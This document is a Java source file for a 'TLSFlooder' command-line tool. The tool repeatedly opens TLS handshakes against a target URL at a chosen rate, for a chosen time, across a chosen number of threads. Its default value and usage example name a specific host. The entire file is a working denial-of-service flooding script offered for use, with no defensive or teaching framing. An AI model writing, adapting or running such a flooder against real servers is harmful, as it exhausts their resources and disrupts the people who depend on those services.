import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.ProxySelector;
import java.net.URI;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public class TLSFlooder {

    private static final String targetUrl = "https://tls.mrrage.xyz";
    private static final int duration = 500; // in seconds
    private static final int requestsPerSec = 8;
    private static final int threads = 1;

    public static void main(String[] args) {
        if (args.length < 4) {
            System.out.println("Usage: java TLSFlooder URL TIME REQ_PER_SEC THREADS");
            System.out.println("Example: java TLSFlooder https://tls.mrrage.xyz 500 8 1");
            System.exit(1);
        }

        String target = args[0];
        int time = Integer.parseInt(args[1]);
        int rate = Integer.parseInt(args[2]);
        int numThreads = Integer.parseInt(args[3]);

        final URI uri = URI.create(target);
        final String host = uri.getHost();
        final int port = uri.getPort() != -1 ? uri.getPort() : 443;

        ExecutorService executorService = Executors.newFixedThreadPool(numThreads);
        long delay = 1000 / rate;
        long startMillis = System.currentTimeMillis();

        for (int i = 0; i < numThreads; i++) {
            executorService.submit(() -> {
                while (System.currentTimeMillis() - startMillis < time * 1000) {
                    makeRequest(host, port);
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }

    private static void makeRequest(String host, int port) {
        try {
            System.setProperty("java.net.preferIPv4Stack", "true");
            System.setProperty("java.net.preferIPv6Addresses", "false");

            SSLContext context = SSLContext.getInstance("TLS");
            context.init(null, null, null);

            SSLSocketFactory factory = context.getSocketFactory();
            SSLSocket socket = (SSLSocket) factory.createSocket(host, port);

            socket.setEnabledCipherSuites(socket.getSupportedCipherSuites());

            socket.startHandshake();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
